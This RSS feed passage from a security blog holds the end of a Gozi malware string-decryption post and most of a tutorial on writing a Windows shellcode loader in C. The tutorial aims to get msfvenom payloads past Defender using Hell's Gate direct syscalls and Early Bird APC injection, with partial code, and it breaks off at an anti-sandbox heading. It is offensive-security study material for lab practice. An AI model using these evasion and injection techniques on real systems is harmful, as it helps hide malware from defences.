&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">curr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">from_bytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">br&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x4&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;little&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">decrypt_strings&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">18&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/8.PNG"
width="1432"
height="465"
srcset="https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/8_hu8fb8e0f89723b469dc90092733f68595_70648_480x0_resize_box_3.PNG 480w, https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/8_hu8fb8e0f89723b469dc90092733f68595_70648_1024x0_resize_box_3.PNG 1024w"
loading="lazy"
alt="Final decrypted strings"
class="gallery-image"
data-flex-grow="307"
data-flex-basis="739px"
>&lt;/p></description></item><item><title>Windows Shellcode Loader in C</title><link>https://Kvn11.github.io/p/windows-shellcode-loader-in-c/</link><pubDate>Fri, 20 Oct 2023 02:45:01 -0700</pubDate><guid>https://Kvn11.github.io/p/windows-shellcode-loader-in-c/</guid><description>&lt;img src="https://Kvn11.github.io/p/windows-shellcode-loader-in-c/img/cover.png" alt="Featured image of post Windows Shellcode Loader in C" />&lt;h2 id="opening-thoughts">Opening Thoughts
&lt;/h2>&lt;p>Over the past couple months I have gone through the Zero2Automated malware RE course, and the Malware Development course from MalDev Academy.
The malware RE course is pretty easy to practice as there are plenty of samples and challenges online to reverse, but finding a challenge for malware development is a bit trickier.
Fortunately, I ran into some problems while studying for the OSCP exam and doing HackTheBox.
Many of the boxes running Windows 10 were able to detect &lt;code>msfvenom&lt;/code>, mimikatz, and other malicous powershell scripts which made it very difficult to get a reverse shell on what should have been very simple boxes.
The OSCP teaches to use &lt;code>Shellter&lt;/code>, but even this tool was failing to bypass Defender.
At this point I figured it&amp;rsquo;d be a good investment to build my own loader so that I wouldn&amp;rsquo;t ever have to worry about this issue again.
I had actually done this project once in C++, but hindsight is 20/20 and I arrived at the conclusion that writing it in C is the best option.
My reasoning is that a loader isn&amp;rsquo;t super complicated, so the organization and object oriented approach that C++ offers doesn&amp;rsquo;t really offer any benefit.
And the added overhead from C++ just makes the final executable larger.
Since I&amp;rsquo;ll be working on boxes where the network bandwidth isn&amp;rsquo;t great, a small and portable executable is better.&lt;/p>
&lt;h2 id="design">Design
&lt;/h2>&lt;p>I was talking to this one person who&amp;rsquo;s been developing game cheats for over 10 years and he told me that all you really need is memory injection and streaming relocations.
Streaming relocations is a bit overkill for this project, so I&amp;rsquo;ll skip that but the injection is definitely optimal.
In the first version I had used APC injection, and ran into issues with my shell dying once the original process terminated.
I&amp;rsquo;m sure I could fix it, but since this is supposed to be an improvement over my &lt;code>1.0&lt;/code> loader I want to go with remote APC injection, aka Early Bird APC injection.
I will also need a quick and easy way of hashing strings, and encrypting my &lt;code>msfvenom&lt;/code> payloads.
For these requirments I&amp;rsquo;ll just use the same code snippets as taught in the MalDev course since crypto isn&amp;rsquo;t one of my strengths.&lt;/p>
&lt;h2 id="hells-gate">Hell&amp;rsquo;s Gate
&lt;/h2>&lt;p>Window&amp;rsquo;s syscall&amp;rsquo;s are the API&amp;rsquo;s that carry out the actions when a WinAPI is called.
The example given in the course is that &lt;code>VirtualAlloc&lt;/code> and &lt;code>VirtualAllocEx&lt;/code> use the &lt;code>NtAllocateVirtualMemory&lt;/code> to carry out their actions.
All the syscalls return an &lt;code>NTSTATUS&lt;/code> value that indicates an error code.
We can use the following docs since most syscalls aren&amp;rsquo;t documented by Microsoft:&lt;/p>
&lt;ul>
&lt;li>&lt;a class="link" href="https://web.archive.org/web/20230401045934/http://undocumented.ntinternals.net/" target="_blank" rel="noopener"
>Undocumented NTInternals&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html" target="_blank" rel="noopener"
>ReactOS&amp;rsquo;s NTDLL Reference&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>The main advantage to using syscalls is that we can evade hooked WinAPI.
Syscalls will have the following structure:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">mov&lt;/span> &lt;span class="no">r10&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">rcx&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">mov&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">SSN&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">syscall&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>SSN referes to the syscall service number that the kernel uses to distinguish one syscall from another.
It&amp;rsquo;s important to note that these values will differ for the same syscall across different OS and OS versions.&lt;/p>
&lt;p>Hell&amp;rsquo;s Gate is a technique that can read through &lt;code>ntdll.dll&lt;/code> to find and execute syscalls.
It&amp;rsquo;s a pretty complex technique that I won&amp;rsquo;t go over here since that isn&amp;rsquo;t the purpose of this post.
But you can read about it &lt;a class="link" href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf" target="_blank" rel="noopener"
>here&lt;/a>.
We can follow the guidance in that paper to get the technique working.
Long story short, we will add a &lt;code>VX_TABLE_ENTRY&lt;/code> to our &lt;code>VX_TABLE&lt;/code> for every syscall we want to use:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_VX_TABLE_ENTRY&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">pAddress&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">dwHash&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">WORD&lt;/span> &lt;span class="n">wSystemCall&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">VX_TABLE_ENTRY&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">PVX_TABLE_ENTRY&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">_VX_TABLE&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">VX_TABLE_ENTRY&lt;/span> &lt;span class="n">NtCreateUserProcess&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">VX_TABLE_ENTRY&lt;/span> &lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">some_syscall&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This table will be populated via the &lt;code>GetVxTableEntry(...)&lt;/code> function given in the paper.&lt;/p>
&lt;p>Then &lt;code>HellsGate&lt;/code> function just loads up the correct SSN to be called, and then &lt;code>HellDescent&lt;/code> actually makes the call:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellsGate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g_Sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NtSyscallEntry&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">wSystemCall&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellDescent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arg1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">arg2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">arg3&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">...);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="early-bird-apc-injection">Early Bird APC Injection
&lt;/h2>&lt;p>&lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" target="_blank" rel="noopener"
>Asynchronous Procedure Calls&lt;/a> (APC&amp;rsquo;s) are functions that execute async in the context of a specific thread.
We can queue an APC to a thread, and the next time the thread is scheduled, it will run the APC function.
In order to run an APC generated by an application, the thread we use must be in an alertable state, which just means that it is in a &amp;ldquo;wait&amp;rdquo; state.
The early bird part of this technique just refers to a remote process instead of the local one.
So we would do the following:&lt;/p>
&lt;ol>
&lt;li>Spawn process in suspended state.&lt;/li>
&lt;li>Write payload to address space of suspended process.&lt;/li>
&lt;li>Get a handle to the suspended thread.&lt;/li>
&lt;li>Pass in address of payload new address, and handle to &lt;code>QueueUserAPC&lt;/code>.&lt;/li>
&lt;li>Resume thread and wait for payload to run.&lt;/li>
&lt;/ol>
&lt;p>Something interesting to note is that normally you&amp;rsquo;d spawn the process like this:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">BOOL&lt;/span> &lt;span class="nf">CreateProcessA&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPCSTR&lt;/span> &lt;span class="n">lpApplicationName&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSTR&lt;/span> &lt;span class="n">lpCommandLine&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSECURITY_ATTRIBUTES&lt;/span> &lt;span class="n">lpProcessAttributes&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSECURITY_ATTRIBUTES&lt;/span> &lt;span class="n">lpThreadAttributes&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BOOL&lt;/span> &lt;span class="n">bInheritHandles&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DWORD&lt;/span> &lt;span class="n">dwCreationFlags&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPVOID&lt;/span> &lt;span class="n">lpEnvironment&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPCSTR&lt;/span> &lt;span class="n">lpCurrentDirectory&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPSTARTUPINFOA&lt;/span> &lt;span class="n">lpStartupInfo&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LPPROCESS_INFORMATION&lt;/span> &lt;span class="n">lpProcessInformation&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">CreateProcessA&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lpPath&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">DEBUG_PROCESS&lt;/span> &lt;span class="c1">// dwCreationFlags,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">StartupInfo&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">ProcInfo&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>However I am using the syscall &lt;code>NtCreateUserProcess&lt;/code>, so I need to use a slightly different calling convention.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 &lt;/span>&lt;span class="c1">// NtCreateUserProcess &amp;amp; NtCreateThreadEx
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellsGate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">g_Sys&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">NtCreateUserProcess&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">wSystemCall&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">HellDescent&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hProcess&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hThread&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PROCESS_ALL_ACCESS&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">THREAD_CREATE_FLAGS_CREATE_SUSPENDED&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">UppProcessParameters&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">psCreateInfo&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pAttributeList&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>To learn more about how &lt;code>NtCreateUserProcess&lt;/code> works I recommend this &lt;a class="link" href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="noopener"
>blog&lt;/a>.&lt;/p>
&lt;p>Now we just write our payload into the memory space of this process.
For this, we need to update our syscall table structure with 3 more syscalls:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="nf">NTSTATUS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NTAPI&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">fnNtAllocateVirtualMemory&lt;/span>&lt;span class="p">)(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">ProcessHandle&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">BaseAddress&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG_PTR&lt;/span> &lt;span class="n">ZeroBits&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PSIZE_T&lt;/span> &lt;span class="n">RegionSize&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">AllocationType&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">Protect&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="nf">NTSTATUS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NTAPI&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">fnNtProtectVirtualMemory&lt;/span>&lt;span class="p">)(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">ProcessHandle&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">BaseAddress&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PULONG&lt;/span> &lt;span class="n">NumberOfBytesToProtect&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">NewAccessProtection&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PULONG&lt;/span> &lt;span class="n">OldAccesProtection&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="nf">NTSTATUS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NTAPI&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">fnNtWriteVirtualMemory&lt;/span>&lt;span class="p">)(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">ProcessHandle&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">BaseAddress&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Buffer&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">NumberOfBytesToWrite&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PULONG&lt;/span> &lt;span class="n">NumberOfBytesWritten&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="anti-sandbox">Anti-Sandbox
&lt;/h2></description></item></channel></rss>